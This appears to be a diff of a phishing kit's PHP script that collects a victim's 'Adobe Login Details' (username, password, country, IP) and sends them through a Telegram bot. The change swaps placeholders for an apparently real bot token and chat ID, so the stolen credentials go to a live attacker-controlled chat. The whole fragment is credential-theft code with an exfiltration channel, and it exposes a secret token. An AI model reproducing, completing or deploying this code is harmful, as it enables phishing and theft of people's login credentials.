@@ -30,8 +30,9 @@ $msg = "<HTML><BODY>
  </HTML>";
 
 // Telegram Bot Configuration
-$telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your Telegram Bot Token
-$telegramChatId = 'YOUR_TELEGRAM_CHAT_ID'; // Replace with your Telegram Chat ID
+$telegramBotToken = '7174369290:AAE8hVpEsJ8paYGEX1fa6w3m06QC0UdqXqg
+'; // Replace with your Telegram Bot Token
+$telegramChatId = '5289984848'; // Replace with your Telegram Chat ID
 $telegramMessage = urlencode("Adobe Login Details\nUsername: $email\nPassword: $password\nCountry: $country\nIP: $ip");
 
 // Send message to Telegram
